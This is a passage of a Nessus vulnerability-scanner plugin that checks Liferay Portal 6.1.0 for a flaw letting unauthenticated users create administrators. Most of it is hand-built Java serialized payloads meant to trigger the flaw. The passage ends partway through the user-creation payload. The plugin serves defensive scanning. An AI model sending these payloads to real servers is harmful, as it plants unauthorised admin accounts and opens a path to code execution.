#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(59359);
  script_version("$Revision: 1.6 $");
  script_cvs_date("$Date: 2016/11/23 20:31:33 $");

  script_bugtraq_id(53546);
  script_osvdb_id(82029);

  script_name(english:"Liferay Portal 6.1.0 Forward Target Handling Security Bypass");
  script_summary(english:"Attempts to create a new administrative user");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Java application that is affected by
a security bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Liferay Portal hosted on the remote web server
contains a flaw in the 'PortletRequestDispatcherImpl' class's
'dispatch' method that allows a remote, unauthenticated attacker to
create new administrative users.  Since administrative users can
install new plugins and extensions, this may lead to arbitrary code
execution. 

Note that this plugin only runs when the 'Perform thorough tests'
setting is enabled and 'safe checks' are disabled.");

  script_set_attribute(attribute:"solution", value:
"Update to the newest version in Git or 6.2.0 when it becomes
available.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Liferay Users disclosure");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/522728");
  script_set_attribute(attribute:"see_also", value:"https://github.com/jelmerk/liferay-tunnel-exploit");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?330e8c09");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?77a3de92");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/04/21");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/05/03");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/06/04");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:liferay:portal");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2012-2016 Tenable Network Security, Inc.");

  script_dependencies("liferay_detect.nasl");
  script_require_keys("www/liferay_portal");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80, 443, 8080);

  exit(0);
}

include("audit.inc");
include("byte_func.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("webapp_func.inc");

global_var uid;

function next_id()
{
  # According to the PoC, MySQL tends to give the admin an ID in the
  # 10000 - 12000 range. We'll try that range first, and then try
  # lower.
  if (isnull(uid))
    uid = 10000;
  else if (uid == 12000)
    uid = 0;
  else if (uid == 9999)
    uid = NULL;
  else
    uid++;

  return uid;
}

function jstr()
{
  local_var str;

  str = _FCT_ANON_ARGS[0];

  return
    mkword(strlen(str)) + # Length of the string
    str;                  # String
}

function jref()
{
  local_var ref;

  ref = _FCT_ANON_ARGS[0];

  return
    raw_string(0x71) + # TC_REFERENCE
    mkdword(ref);      # Handle
}

function payload_find(id, url)
{
  # Create the payload, in Java's serialized format, that calls the
  # method. Note that the comments are likely not entirely correct.
  return
    ##################################################################
    # Header
    ##################################################################
    raw_string(0xAC, 0xED) +                                     # STREAM_MAGIC
    raw_string(0x00, 0x05) +                                     # STREAM_VERSION

    ##################################################################
    # ObjectValuePair (http://www.nessus.org/u?c4b42f8e)
    ##################################################################
    raw_string(0x73) +                                           # TC_OBJECT
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("com.liferay.portal.kernel.util.ObjectValuePair") +     # Class name
    raw_string(0x58, 0x00, 0xCF, 0xD0, 0xA7, 0x28, 0xF6, 0xF0) + # Version UID of the class
    raw_string(0x02) +                                           # Flags (SC_SERIALIZABLE)
    raw_string(0x00, 0x02) +                                     # Number of members in class

    # Field
    "L" +                                                        # Member type (object :: String)
    jstr("_key") +                                               # Member name
    raw_string(0x74) +                                           # TC_STRING
    jstr("Ljava/lang/Object;") +                                 # Canonical JVM signature

    # Field
    "L" +                                                        # Member type (object :: ???)
    jstr("_value") +                                             # Member name
    jref(0x007E0001) +                                           # Handle
    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    ##################################################################
    # HttpPrincipal (http://www.nessus.org/u?b05125e7)
    ##################################################################
    raw_string(0x73) +                                           # TC_OBJECT
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("com.liferay.portal.security.auth.HttpPrincipal") +     # Class name
    raw_string(0xEF, 0x86, 0x08, 0x4E, 0xE9, 0xB6, 0xFD, 0xDB) + # Version UID of the class
    raw_string(0x02) +                                           # Flags (SC_SERIALIZABLE)
    raw_string(0x00, 0x04) +                                     # Number of members in class

    # Member
    "J" +                                                        # Member type (long)
    jstr("_companyId") +                                         # Member name

    # Member
    "L" +                                                        # Member type (object)
    jstr("_login") +                                             # Member name
    raw_string(0x74) +                                           # TC_STRING
    jstr("Ljava/lang/String;") +                                 # Canonical JVM signature

    # Member
    "L" +                                                        # Member type (object)
    jstr("_password") +                                          # Member name
    jref(0x007E0004) +                                           # Handle

    # Member
    "L" +                                                        # Member type (object)
    jstr("_url") +                                               # Member name
    jref(0x007E0004) +                                           # Handle
    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    # Value :: _companyId
    raw_string(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) + # Long (_companyId)

    # Value :: _login
    raw_string(0x74) +                                           # TC_STRING
    jstr(string(id)) +                                           # String (_login)

    # Value :: _password
    raw_string(0x70) +                                           # TC_NULL

    # Value :: _url
    raw_string(0x74) +                                           # TC_STRING
    jstr(url) +                                                  # String (HttpPrincipal)

    ##################################################################
    # MethodHandler (http://www.nessus.org/u?d408ab1c)
    ##################################################################
    raw_string(0x73) +                                           # TC_OBJECT
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("com.liferay.portal.kernel.util.MethodHandler") +       # Class name
    raw_string(0xF9, 0x17, 0x52, 0x01, 0xEC, 0xBD, 0x8E, 0x03) + # Version UID of the class
    raw_string(0x02) +                                           # Flags (SC_SERIALIZABLE)
    raw_string(0x00, 0x02) +                                     # Number of members in class

    # Member
    "[" +                                                        # Array
    jstr("_arguments") +                                         # Member name
    raw_string(0x74) +                                           # TC_STRING
    jstr("[Ljava/lang/Object;") +                                # Canonical JVM signature

    # Member
    "L" +                                                        # Member type (object)
    jstr("_methodKey") +                                         # Member name
    raw_string(0x74) +                                           # TC_STRING
    jstr("Lcom/liferay/portal/kernel/util/MethodKey;") +         # Canonical JVM signature
    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    # Value :: _arguments
    raw_string(0x75) +                                           # TC_ARRAY

    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("[Ljava.lang.Object;") +                                # Canonical JVM signature
    raw_string(0x90, 0xCE, 0x58, 0x9F, 0x10, 0x73, 0x29, 0x6C) + # Version UID of the class
    raw_string(0x02) +                                           # Flags (SC_SERIALIZABLE)
    raw_string(0x00, 0x00) +                                     # Number of members in class
    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    raw_string(0x00, 0x00, 0x00, 0x01) +                         # Data

    ##################################################################
    # Long
    ##################################################################
    raw_string(0x73) +                                           # TC_OBJECT
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("java.lang.Long") +                                     # Class name
    raw_string(0x3B, 0x8B, 0xE4, 0x90, 0xCC, 0x8F, 0x23, 0xDF) + # Version UID of the class
    raw_string(0x02) +                                           # Flags (SC_SERIALIZABLE)
    raw_string(0x00, 0x01) +                                     # Number of members in class

    # Member
    "J" +                                                        # Member type (long)
    jstr("value") +                                              # Member name

    raw_string(0x78) +                                           # TC_ENDBLOCKDATA

    # Superclass
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("java.lang.Number") +                                   # Class name
    raw_string(0x86, 0xAC, 0x95, 0x1D, 0x0B, 0x94, 0xE0, 0x8B) + # Version UID of the class
    raw_string(0x02) +                                           # Flags (SC_SERIALIZABLE)
    raw_string(0x00, 0x00) +                                     # Number of members in class
    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    # Value :: value
    raw_string(0x00, 0x00, 0x00, 0x00) +                         # High 32-bits of user ID
    mkdword(id) +                                                # Low 32-bits of user ID

    ##################################################################
    # MethodKey (http://www.nessus.org/u?2e2b1ab1)
    ##################################################################
    raw_string(0x73) +                                           # TC_OBJECT
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("com.liferay.portal.kernel.util.MethodKey") +           # Class name
    raw_string(0xED, 0xDE, 0x26, 0xC5, 0xA1, 0xEE, 0x48, 0x3B) + # Version UID of the class
    raw_string(0x02) +                                           # Flags (SC_SERIALIZABLE)
    raw_string(0x00, 0x04) +                                     # Number of members in class

    # Member
    "L" +                                                        # Member type (object)
    jstr("_className") +                                         # Member name
    jref(0x007E0004) +                                           # Handle

    # Member
    "L" +                                                        # Member type (object)
    jstr("_methodName") +                                        # Member name
    jref(0x007E0004) +                                           # Handle

    # Member
    "[" +                                                        # Array
    jstr("_parameterTypes") +                                    # Member name
    raw_string(0x74) +                                           # TC_STRING
    jstr("[Ljava/lang/Class;") +                                 # Canonical JVM signature

    "L" +                                                        # Object
    jstr("_toString") +                                          # Data

    jref(0x007E0004) +                                           # Handle
    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    # Value :: _className
    raw_string(0x74) +                                           # TC_STRING
    jstr("com.liferay.portal.service.RoleServiceUtil") +         # Class name

    # Value :: _methodName
    raw_string(0x74) +                                           # TC_STRING
    jstr("getUserRoles") +                                       # Method name

    # Value :: _parameterTypes
    raw_string(0x75) +                                           # TC_ARRAY
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("[Ljava.lang.Class;") +                                 # Canonical JVM signature
    raw_string(0xAB, 0x16, 0xD7, 0xAE, 0xCB, 0xCD, 0x5A, 0x99) + # Version UID of the class
    raw_string(0x02) +                                           # Flags (SC_SERIALIZABLE)
    raw_string(0x00, 0x00) +                                     # Number of members in class
    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    raw_string(0x00, 0x00, 0x00, 0x01) +                         # Data

    ##################################################################
    # Object
    ##################################################################
    raw_string(0x76) +                                           # TC_CLASS
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("long") +                                               # Class name
    raw_string(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) + # Data
    raw_string(0x00, 0x00, 0x00) +                               # ???
    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    raw_string(0x70);                                            # TC_NULL
}

function payload_create(email, firstname, id, lastname, url, user)
{
  # Create the payload, in Java's serialized format, that calls the
  # method. Note that the comments are likely not entirely correct.
  return
    ##################################################################
    # Header
    ##################################################################
    raw_string(0xAC, 0xED) +                                     # STREAM_MAGIC
    raw_string(0x00, 0x05) +                                     # STREAM_VERSION

    ##################################################################
    # ObjectValuePair (http://www.nessus.org/u?c4b42f8e)
    ##################################################################
    raw_string(0x73) +                                           # TC_OBJECT
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("com.liferay.portal.kernel.util.ObjectValuePair") +     # Class name
    raw_string(0x58, 0x00, 0xCF, 0xD0, 0xA7, 0x28, 0xF6, 0xF0) + # Version UID of the class
    raw_string(0x02) +                                           # Flags (SC_SERIALIZABLE)
    raw_string(0x00, 0x02) +                                     # Number of members in class

    # Field
    "L" +                                                        # Member type (object)
    jstr("_key") +                                               # Member name
    raw_string(0x74) +                                           # TC_STRING
    jstr("Ljava/lang/Object;") +                                 # Canonical JVM signature

    # Field
    "L" +                                                        # Member type (object)
    jstr("_value") +                                             # Member name
    jref(0x007E0001) +                                           # Handle
    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    ##################################################################
    # HttpPrincipal (http://www.nessus.org/u?b05125e7)
    ##################################################################
    raw_string(0x73) +                                           # TC_OBJECT
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("com.liferay.portal.security.auth.HttpPrincipal") +     # Class name
    raw_string(0xEF, 0x86, 0x08, 0x4E, 0xE9, 0xB6, 0xFD, 0xDB) + # Version UID of the class
    raw_string(0x02) +                                           # Flags (SC_SERIALIZABLE)
    raw_string(0x00, 0x04) +                                     # Number of members in class

    # Member
    "J" +                                                        # Member type (long)
    jstr("_companyId") +                                         # Member name

    # Member
    "L" +                                                        # Member type (object)
    jstr("_login") +                                             # Member name
    raw_string(0x74) +                                           # TC_STRING
    jstr("Ljava/lang/String;") +                                 # Canonical JVM signature

    # Member
    "L" +                                                        # Member type (object)
    jstr("_password") +                                          # Member name
    jref(0x007E0004) +                                           # Handle

    # Member
    "L" +                                                        # Member type (object)
    jstr("_url") +                                               # Member name
    jref(0x007E0004) +                                           # Handle
    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    # Value :: _companyId
    raw_string(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) + # Long (_companyId)

    # Value :: _login
    raw_string(0x74) +                                           # TC_STRING
    jstr(string(id)) +                                           # String (_login)

    # Value :: _password
    raw_string(0x70) +                                           # TC_NULL

    # Value :: _url
    raw_string(0x74) +                                           # TC_STRING
    jstr(url) +                                                  # String (HttpPrincipal)

    ##################################################################
    # MethodHandler (http://www.nessus.org/u?d408ab1c)
    ##################################################################
    raw_string(0x73) +                                           # TC_OBJECT
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("com.liferay.portal.kernel.util.MethodHandler") +       # Class name
    raw_string(0xF9, 0x17, 0x52, 0x01, 0xEC, 0xBD, 0x8E, 0x03) + # Version UID of the class
    raw_string(0x02) +                                           # Flags (SC_SERIALIZABLE)
    raw_string(0x00, 0x02) +                                     # Number of members in class

    # Member
    "[" +                                                        # Array
    jstr("_arguments") +                                         # Member name
    raw_string(0x74) +                                           # TC_STRING
    jstr("[Ljava/lang/Object;") +                                # Canonical JVM signature

    # Member
    "L" +                                                        # Member type (object)
    jstr("_methodKey") +                                         # Member name
    raw_string(0x74) +                                           # TC_STRING
    jstr("Lcom/liferay/portal/kernel/util/MethodKey;") +         # Canonical JVM signature
    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    # Value :: _arguments
    raw_string(0x75) +                                           # TC_ARRAY

    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("[Ljava.lang.Object;") +                                # Canonical JVM signature
    raw_string(0x90, 0xCE, 0x58, 0x9F, 0x10, 0x73, 0x29, 0x6C) + # Version UID of the class
    raw_string(0x02) +                                           # Flags (SC_SERIALIZABLE)
    raw_string(0x00, 0x00) +                                     # Number of members in class
    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    raw_string(0x00, 0x00, 0x00, 0x1A) +                         # Data

    ##################################################################
    # Long
    ##################################################################
    raw_string(0x73) +                                           # TC_OBJECT
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("java.lang.Long") +                                     # Class name
    raw_string(0x3B, 0x8B, 0xE4, 0x90, 0xCC, 0x8F, 0x23, 0xDF) + # Version UID of the class
    raw_string(0x02) +                                           # Flags (SC_SERIALIZABLE)
    raw_string(0x00, 0x01) +                                     # Number of members in class

    # Member
    "J" +                                                        # Member type (long)
    jstr("value") +                                              # Member name

    raw_string(0x78) +                                           # TC_ENDBLOCKDATA

    # Superclass
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("java.lang.Number") +                                   # Class name
    raw_string(0x86, 0xAC, 0x95, 0x1D, 0x0B, 0x94, 0xE0, 0x8B) + # Version UID of the class
    raw_string(0x02) +                                           # Flags (SC_SERIALIZABLE)
    raw_string(0x00, 0x00) +                                     # Number of members in class
    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    # Value :: value
    raw_string(0x00, 0x00, 0x00, 0x00) +                         # High 32-bits of user ID
    mkdword(1) +                                                 # Low 32-bits of user ID

    ##################################################################
    # Boolean
    ##################################################################
    raw_string(0x73) +                                           # TC_OBJECT
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("java.lang.Boolean") +                                  # Class name
    raw_string(0xCD, 0x20, 0x72, 0x80, 0xD5, 0x9C, 0xFA, 0xEE) + # Version UID of the class
    raw_string(0x02) +                                           # Flags (SC_SERIALIZABLE)
    raw_string(0x00, 0x01) +                                     # Number of members in class

    # Member
    "Z" +                                                        # Member type (boolean)
    jstr("value") +                                              # Member name
    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    # Value :: value
    raw_string(0x00) +                                           # False

    ##################################################################
    # Strings
    ##################################################################
    raw_string(0x74) +                                           # TC_STRING
    jstr("password") +                                           # Data

    jref(0x007E0013) +                                           # Handle

    jref(0x007E0012) +                                           # Handle

    raw_string(0x74) +                                           # TC_STRING
    jstr(user) +                                                 # Data

    raw_string(0x74) +                                           # TC_STRING
    jstr(email) +                                                # Data

    raw_string(0x73) +                                           # TC_OBJECT
    jref(0x007E000E) +                                           # Handle
    raw_string(0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00) + # Data

    raw_string(0x74) +                                           # TC_STRING
    jstr("") +                                                   # Data

    ##################################################################
    # Object
    ##################################################################
    raw_string(0x73) +                                           # TC_OBJECT
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("java.util.Locale") +                                   # Class name
    raw_string(0x7E, 0xF8, 0x11, 0x60, 0x9C, 0x30, 0xF9, 0xEC) + # Version UID of the class
    raw_string(0x02) +                                           # Flags (SC_SERIALIZABLE)
    raw_string(0x00, 0x04) +                                     # Number of members in class

    # Member
    "I" +                                                        # Member type (integer)
    jstr("hashcode") +                                           # Member name

    # Member
    "L" +                                                        # Member type (object)
    jstr("country") +                                            # Member name
    jref(0x007E0004) +                                           # Handle

    # Member
    "L" +                                                        # Member type (object)
    jstr("language") +                                           # Member name
    jref(0x007E0004) +                                           # Handle

    # Member
    "L" +                                                        # Member type (object)
    jstr("variant") +                                            # Member name
    jref(0x007E0004) +                                           # Handle

    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    # Value :: hashcode
    raw_string(0xFF, 0xFF, 0xFF, 0xFF) +                         # Data

    # Value :: country
    jref(0x007E0017) +                                           # Handle

    # Value :: language
    raw_string(0x74) +                                           # TC_STRING
    jstr("en") +                                                 # Data

    # Value :: variant
    jref(0x007E0017) +                                           # Handle

    ##################################################################
    # Strings
    ##################################################################
    raw_string(0x74) +                                           # TC_STRING
    jstr(firstname) +                                            # Data
    jref(0x007E0017) +                                           # Handle

    raw_string(0x74) +                                           # TC_STRING
    jstr(lastname) +                                             # Data

    ##################################################################
    # Object
    ##################################################################
    raw_string(0x73) +                                           # TC_OBJECT
    raw_string(0x72) +                                           # TC_CLASSDESC
    raw_string(0x00, 0x11) +                                     # Length of class name
    "java.lang.Integer" +                                        # Class name
    raw_string(0x12, 0xE2, 0xA0, 0xA4, 0xF7, 0x81, 0x87, 0x38) + # Version UID of the class
    raw_string(0x02) +                                           # Flags (SC_SERIALIZABLE)
    raw_string(0x00, 0x01) +                                     # Number of members in class

    # Member
    "I" +                                                        # Member type (integer)
    jstr("value") +                                              # Member name

    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    jref(0x007E000F) +                                           # Handle

    # Value :: value
    raw_string(0x00, 0x00, 0x00, 0x00) +                         # Data

    jref(0x007E001E) +                                           # Handle

    ##################################################################
    # Object
    ##################################################################
    raw_string(0x73) +                                           # TC_OBJECT
    jref(0x007E0011) +                                           # Handle

    raw_string(0x01) +                                           # Data

    ##################################################################
    # Object
    ##################################################################
    raw_string(0x73) +                                           # TC_OBJECT
    jref(0x007E001D) +                                           # Handle

    raw_string(0x00, 0x00, 0x00, 0x01) +                         # Data

    jref(0x007E0020) +                                           # Handle

    ##################################################################
    # Object
    ##################################################################
    raw_string(0x73) +                                           # TC_OBJECT
    jref(0x007E001D) +                                           # Handle

    raw_string(0x00, 0x00, 0x07, 0xBC) +                         # Data

    ##################################################################
    # String
    ##################################################################
    raw_string(0x74) +                                           # TC_STRING
    jstr("") +                                                   # Data

    ##################################################################
    # Array
    ##################################################################
    raw_string(0x75) +                                           # TC_ARRAY
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("[J") +                                                 # Class name
    raw_string(0x78, 0x20, 0x04, 0xB5, 0x12, 0xB1, 0x75, 0x93) + # Version UID of the class
    raw_string(0x02) +                                           # Flags (SC_SERIALIZABLE)
    raw_string(0x00, 0x00) +                                     # Number of members in class

    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    raw_string(0x00, 0x00, 0x00, 0x00) +                         # Data

    ##################################################################
    # Arrays
    ##################################################################
    raw_string(0x75) +                                           # TC_ARRAY
    jref(0x007E0023) +                                           # Handle

    raw_string(0x00, 0x00, 0x00, 0x00) +                         # Data

    raw_string(0x75) +                                           # TC_ARRAY
    jref(0x007E0023) +                                           # Handle

    raw_string(0x00, 0x00, 0x00, 0x01) +                         # Data
    raw_string(0x00, 0x00, 0x00, 0x00) +                         # Data
    raw_string(0x00, 0x00, 0x00, 0x0F) +                         # Data

    raw_string(0x75) +                                           # TC_ARRAY
    jref(0x007E0023) +                                           # Handle

    raw_string(0x00, 0x00, 0x00, 0x00) +                         # Data

    jref(0x007E0012) +                                           # Handle

    ##################################################################
    # Object
    ##################################################################
    raw_string(0x73) +                                           # TC_OBJECT
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("com.liferay.portal.service.ServiceContext") +          # Class name
    raw_string(0x3E, 0x3B, 0x5A, 0xBA, 0x6C, 0xF2, 0xB8, 0x56) + # Version UID of the class
    raw_string(0x02) +                                           # Flags (SC_SERIALIZABLE)
    raw_string(0x00, 0x21) +                                     # Number of members in class

    # Member
    "Z" +                                                        # Member type (boolean)
    jstr("_addGroupPermissions") +                               # Member name

    # Member
    "Z" +                                                        # Member type (boolean)
    jstr("_addGuestPermissions") +                               # Member name

    # Member
    "Z" +                                                        # Member type (boolean)
    jstr("_assetEntryVisible") +                                 # Member name

    # Member
    "J" +                                                        # Member type (long)
    jstr("_companyId") +                                         # Member name

    # Member
    "Z" +                                                        # Member type (boolean)
    jstr("_deriveDefaultPermissions") +                          # Member name

    # Member
    "Z" +                                                        # Member type (boolean)
    jstr("_indexingEnabled") +                                   # Member name

    # Member
    "J" +                                                        # Member type (long)
    jstr("_plid") +                                              # Member name

    # Member
    "J" +                                                        # Member type (long)
    jstr("_scopeGroupId") +                                      # Member name

    # Member
    "Z" +                                                        # Member type (boolean)
    jstr("_signedIn") +                                          # Member name

    # Member
    "J" +                                                        # Member type (long)
    jstr("_userId") +                                            # Member name

    # Member
    "I" +                                                        # Member type (integer)
    jstr("_workflowAction") +                                    # Member name

    # Member
    "[" +                                                        # Member type (array)
    jstr("_assetCategoryIds") +                                  # Member name

    # Member
    raw_string(0x74) +                                           # TC_STRING
    jstr("[J") +                                                 # Member name

    # Member
    "[" +                                                        # Member type (array)
    jstr("_assetLinkEntryIds") +                                 # Data

    jref(0x007E0029) +                                           # Handle

    # Member
    "[" +                                                        # Member type (array)
    jstr("_assetTagNames") +                                     # Member name

    # Member
    raw_string(0x74) +                                           # TC_STRING
    jstr("[Ljava/lang/String;") +                                # Canonical JVM signature

    # Member
    "L" +                                                        # Member type (object)
    jstr("_attributes") +                                        # Member name

    # Member
    raw_string(0x74) +                                           # TC_STRING
    jstr("Ljava/util/Map;") +                                    # Canonical JVM signature

    # Member
    "L" +                                                        # Member type (object)
    jstr("_command") +                                           # Member name

    jref(0x007E0004) +                                           # Handle

    # Member
    "L" +                                                        # Member type (object)
    jstr("_createDate") +                                        # Member name

    # Member
    raw_string(0x74) +                                           # TC_STRING
    jstr("Ljava/util/Date;") +                                   # Canonical JVM signature

    # Member
    "L" +                                                        # Member type (object)
    jstr("_currentURL") +                                        # Member name

    jref(0x007E0004) +                                           # Handle

    # Member
    "L" +                                                        # Member type (object)
    jstr("_expandoBridgeAttributes") +                           # Member name

    jref(0x007E002B) +                                           # Handle

    # Member
    "[" +                                                        # Member type (array)
    jstr("_groupPermissions") +                                  # Member name

    jref(0x007E002A) +                                           # Handle

    # Member
    "[" +                                                        # Member type (array)
    jstr("_guestPermissions") +                                  # Member name

    jref(0x007E002A) +                                           # Handle

    # Member
    "L" +                                                        # Member type (object)
    jstr("_headers") +                                           # Member name

    jref(0x007E002B) +                                           # Handle

    # Member
    "L" +                                                        # Member type (object)
    jstr("_languageId") +                                        # Member name

    jref(0x007E0004) +                                           # Handle

    # Member
    "L" +                                                        # Member type (object)
    jstr("_layoutFullURL") +                                     # Member name

    jref(0x007E0004) +                                           # Handle

    # Member
    "L" +                                                        # Member type (object)
    jstr("_layoutURL") +                                         # Member name

    jref(0x007E0004) +                                           # Handle

    # Member
    "L" +                                                        # Member type (object)
    jstr("_modifiedDate") +                                      # Member name

    jref(0x007E002C) +                                           # Handle

    # Member
    "L" +                                                        # Member type (object)
    jstr("_pathMain") +                                          # Member name

    jref(0x007E0004) +                                           # Handle

    # Member
    "L" +                                                        # Member type (object)
    jstr("_portalURL") +                                         # Member name

    jref(0x007E0004) +                                           # Handle

    # Member
    "L" +                                                        # Member type (object)
    jstr("_portletPreferencesIds") +                             # Member name

    # Member
    raw_string(0x74) +                                           # TC_STRING
    jstr("Lcom/liferay/portal/model/PortletPreferencesIds;") +   # Canonical JVM signature

    # Member
    "L" +                                                        # Member type (object)
    jstr("_remoteAddr") +                                        # Member name

    jref(0x007E0004) +                                           # Handle

    # Member
    "L" +                                                        # Member type (object)
    jstr("_remoteHost") +                                        # Member name

    jref(0x007E0004) +                                           # Handle

    # Member
    "L" +                                                        # Member type (object)
    jstr("_userDisplayURL") +                                    # Member name

    jref(0x007E0004) +                                           # Handle

    # Member
    "L" +                                                        # Member type (object)
    jstr("_uuid") +                                              # Member name

    jref(0x007E0004) +                                           # Handle

    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    raw_string(0x00, 0x00, 0x01, 0x00) +                         # Data
    raw_string(0x00, 0x00, 0x00, 0x00) +                         # Data
    raw_string(0x00, 0x00, 0x00, 0x00) +                         # Data
    raw_string(0x01, 0x00, 0x00, 0x00) +                         # Data
    raw_string(0x00, 0x00, 0x00, 0x00) +                         # Data
    raw_string(0x00, 0x00, 0x00, 0x00) +                         # Data
    raw_string(0x00, 0x00, 0x00, 0x00) +                         # Data
    raw_string(0x00, 0x00, 0x00, 0x00) +                         # Data
    raw_string(0x00, 0x00, 0x00, 0x00) +                         # Data
    raw_string(0x00, 0x00, 0x00, 0x00) +                         # Data
    raw_string(0x00, 0x01) +                                     # Data

    raw_string(0x70) +                                           # TC_NULL
    raw_string(0x70) +                                           # TC_NULL
    raw_string(0x70) +                                           # TC_NULL

    ##################################################################
    # Object
    ##################################################################
    raw_string(0x73) +                                           # TC_OBJECT
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("java.util.LinkedHashMap") +                            # Class name
    raw_string(0x34, 0xC0, 0x4E, 0x5C, 0x10, 0x6C, 0xC0, 0xFB) + # Version UID of the class
    raw_string(0x02) +                                           # Flags (SC_SERIALIZABLE)
    raw_string(0x00, 0x01) +                                     # Number of members in class

    # Member
    "Z" +                                                        # Member type (boolean)
    jstr("accessOrder") +                                        # Member name

    raw_string(0x78) +                                           # TC_ENDBLOCKDATA

    # Superclass
    raw_string(0x72) +                                           # TC_CLASSDESC
    jstr("java.util.HashMap") +                                  # Class name
    raw_string(0x05, 0x07, 0xDA, 0xC1, 0xC3, 0x16, 0x60, 0xD1) + # Version UID of the class
    raw_string(0x03) +                                           # Flags (SC_WRITE_METHOD, SC_SERIALIZABLE)
    raw_string(0x00, 0x02) +                                     # Number of members in class

    # Member
    "F" +                                                        # Member type (float)
    jstr("loadFactor") +                                         # Member name

    # Member
    "I" +                                                        # Member type (integer)
    jstr("threshold") +                                          # Member name

    raw_string(0x78) +                                           # TC_ENDBLOCKDATA
    raw_string(0x70) +                                           # TC_NULL

    raw_string(0x3F, 0x40, 0x00, 0x00) +                         # Data
    raw_string(0x00, 0x00, 0x00, 0x0C) +                         # Data

    raw_string(0x77) +                                           # TC_BLOCKDATA
    raw_string(0x08) +                                           # Length of blockdata
    raw_string(0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00) + # Data
    raw_string(0x78) +                                           # TC_ENDBLOCKDATA

    raw_string(0x00) +                                           # Unknown

    raw_string(0x70) +                                           # TC_NULL
    raw_string(0x70) +                                           # TC_NULL
    raw_string(0x70) +                                           # TC_NULL

    ##################################################################
    # Object
    ##################################################################
    raw_string(0x73) +                                           # TC_OBJECT
    jref(0x007E002F) +                                           # Handle

    raw_string(0x3F, 0x40, 0x00, 0x00) +                         # Data
    raw_string(0x00, 0x00, 0x00, 0x0C) +                         # Data

    raw_string(0x77) +                                           # TC_BLOCKDATA
    raw_string(0x08) +                                           # Length of blockdata
    raw_string(0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00) + # Data
    raw_string(0x78) +                                           # TC_ENDBLOCKDATA

